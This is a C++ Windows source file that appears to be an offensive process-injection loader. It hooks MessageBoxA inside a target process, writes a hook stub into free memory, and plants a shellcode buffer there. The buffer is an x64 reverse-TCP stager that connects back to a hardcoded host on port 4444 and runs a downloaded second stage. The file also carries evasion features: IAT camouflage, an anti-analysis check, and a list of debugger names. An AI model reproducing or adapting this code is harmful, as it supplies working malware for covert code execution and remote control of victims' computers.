#include "Windows.h"
#include <tlhelp32.h>
#include "API/headers/api.h"
#include "utils/headers/antianalysis.h"
#include "../headers/payload.h"


#define TARGET_FUNC	"MessageBoxA"
#define TARGET_DLL	"USER32"


DWORD GetPID(const char* process, API::API_ACCESS& api);
void ExitProgram(const char* message);

// spawn calculator
//unsigned char rawData[106] = {
//		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
//		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
//		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
//		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
//		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
//		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
//		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
//		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
//		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
//};


unsigned char rawData[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x38\x66\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";


unsigned char g_HookShellCode[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};

/*

WCHAR* debuggers[] = {
		L"x64dbg.exe",                 
		L"ida.exe",                    
		L"ida64.exe",                  
		L"VsDebugConsole.exe",         
		L"msvsmon.exe"                 
};
*/


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	AntiAnalysis debug;
	
	ULONG_PTR uAddress = NULL;

	auto& resolver = API::APIResolver::GetInstance();

	resolver.IATCamo();
	resolver.LoadModules();
	resolver.ResolveFunctions();

	auto resolved	  = resolver.GetAPIAccess();
	//debug.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger

	HMODULE hModule = GetModuleHandleA(TARGET_DLL);

	if (hModule == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
		return -1;
	}
	
	auto pFunctionToHook = GetProcAddress(hModule, TARGET_FUNC);

	if (!pFunctionToHook)
	{
		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
		return -1;
	}
	

	PatchHook(pFunctionToHook);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, GetPID("payload.exe", resolved));

	if (hProcess == INVALID_HANDLE_VALUE)
		ExitProgram("failed to get a handle to the process");

	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(rawData) + sizeof(g_HookShellCode), resolved))
		ExitProgram("failed to find a memory gap");


	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_HookShellCode, sizeof(g_HookShellCode), (ULONG_PTR)rawData, sizeof(rawData)))
		ExitProgram("failed to write payload buffer");


	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
		ExitProgram("failed to install hook");
	
	MessageBoxA(NULL, "stage 1 complete", "error", MB_ICONWARNING);


	return 0;
} 

void ExitProgram(const char* message)
{
	MessageBoxA(NULL, message, "error", MB_ICONWARNING);
	ExitProcess(-1);
}


DWORD GetPID(const char* process, API::API_ACCESS& api) {
	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &processEntry)) {
			do {
				if (strcmp(process, processEntry.szExeFile) == 0) {
					processId = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}
	return processId;
}